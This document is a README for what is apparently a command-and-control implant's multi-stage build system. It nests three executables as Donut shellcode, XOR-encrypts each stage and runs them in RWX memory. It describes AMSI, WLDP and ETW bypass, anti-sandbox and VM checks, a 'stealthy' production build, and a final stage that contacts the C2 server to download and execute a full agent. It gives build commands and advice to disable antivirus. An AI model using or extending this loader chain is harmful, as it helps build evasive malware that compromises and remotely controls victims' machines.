# Multi-Stage Build System with Donut

## Overview

The multi-stage build system creates a chain of executables:
1. **ESTER** (Stage 1) - Entry point, environment validation
2. **JAVELIN** (Stage 2) - In-memory loader 
3. **Stage0** (Stage 3) - Bootstrap payload that contacts C2

Each stage is embedded inside the previous one as **position-independent shellcode (PIC)**, generated using [Donut](https://github.com/TheWover/donut).

## Why Donut?

Standard Windows EXE files cannot be executed directly in memory - they have PE headers, import tables, and require proper loading. Donut converts these EXEs to shellcode that:

- ✅ Is position-independent (can run from any memory address)
- ✅ Bypasses AMSI, WLDP, and ETW
- ✅ Handles PE loading internally
- ✅ Supports encryption and compression
- ✅ Patches exit calls to avoid killing the host process

## Requirements

You need **one** of the following:

### Option 1: donut-shellcode Python module (recommended)

```bash
pip install donut-shellcode
```

⚠️ **Note**: This requires a C compiler and may be blocked by antivirus during installation.

### Option 2: donut.exe binary

Download from [GitHub Releases](https://github.com/TheWover/donut/releases) and place in:
- `builder/scripts/donut.exe`
- `tools/donut.exe`

⚠️ **Note**: donut.exe will be detected by antivirus. You may need to add an exclusion.

### Option 3: Build from source

```powershell
.\builder\scripts\build-donut.ps1
```

This clones the donut repository and compiles it with MSVC.

## Usage

### Basic Multi-Stage Build

```powershell
.\build-all.ps1 -ServerIP 192.168.1.10 -MultiStage
```

### Production Build (stealthy)

```powershell
.\build-all.ps1 -ServerIP 192.168.1.10 -MultiStage -Production
```

### Manual Build with Builder

```powershell
cargo run --package builder -- build-staged --server 192.168.1.10:4444 --output dist
```

## Build Process

```
┌─────────────────────────────────────────────────────────────────────┐
│ 1. Compile Stage0.exe                                               │
│    └── Convert to shellcode with donut                              │
│        └── Encrypt with XOR                                         │
│            └── Embed in JAVELIN source                              │
├─────────────────────────────────────────────────────────────────────┤
│ 2. Compile JAVELIN.exe (contains encrypted Stage0 shellcode)        │
│    └── Convert to shellcode with donut                              │
│        └── Encrypt with XOR                                         │
│            └── Embed in ESTER source                                │
├─────────────────────────────────────────────────────────────────────┤
│ 3. Compile ESTER.exe (contains encrypted JAVELIN shellcode)         │
│    └── Final output: dist/ester.exe                                 │
└─────────────────────────────────────────────────────────────────────┘
```

## Execution Flow

When `ester.exe` runs:

```
ester.exe
    │
    ├── [1] Anti-sandbox checks (timing, VM detection, etc.)
    │
    ├── [2] Decrypt JAVELIN shellcode (XOR)
    │
    ├── [3] Allocate RWX memory
    │
    └── [4] Execute JAVELIN shellcode
            │
            ├── [1] Decrypt Stage0 shellcode (XOR)
            │
            ├── [2] Allocate RWX memory
            │
            └── [3] Execute Stage0 shellcode
                    │
                    ├── [1] Connect to C2 server
                    │
                    ├── [2] Key exchange
                    │
                    └── [3] Download and execute full agent
```

## Donut Configuration

The builder uses these default settings:

| Option | Value | Description |
|--------|-------|-------------|
| Architecture | amd64 (2) | 64-bit only |
| Bypass | Continue (3) | Continue even if AMSI/WLDP patch fails |
| Compression | None (1) | No compression for speed |
| Entropy | Full (3) | Random names + encryption |
| Exit | Thread (1) for Stage0, Don't Exit (3) for JAVELIN | Prevents killing host |

## Troubleshooting

### "Donut not found"

1. Install Python module: `pip install donut-shellcode`
2. Or download donut.exe and place in `builder/scripts/`
3. Or build from source: `.\builder\scripts\build-donut.ps1`

### "Antivirus blocking donut"

Donut is a legitimate red team tool, but AV flags it. Options:
1. Add exclusion for your project directory
2. Disable real-time protection temporarily during build
3. Use a VM for builds

### "Build failed - shellcode generation error"

Check that:
1. Input EXE was compiled successfully
2. Donut is properly installed
3. Target architecture matches (x64)

## References

- [Donut GitHub](https://github.com/TheWover/donut)
- [Donut Documentation](https://github.com/TheWover/donut/blob/master/docs/devnotes.md)
- [In-Memory Execution of DLL](https://modexp.wordpress.com/2019/06/24/inmem-exec-dll/)
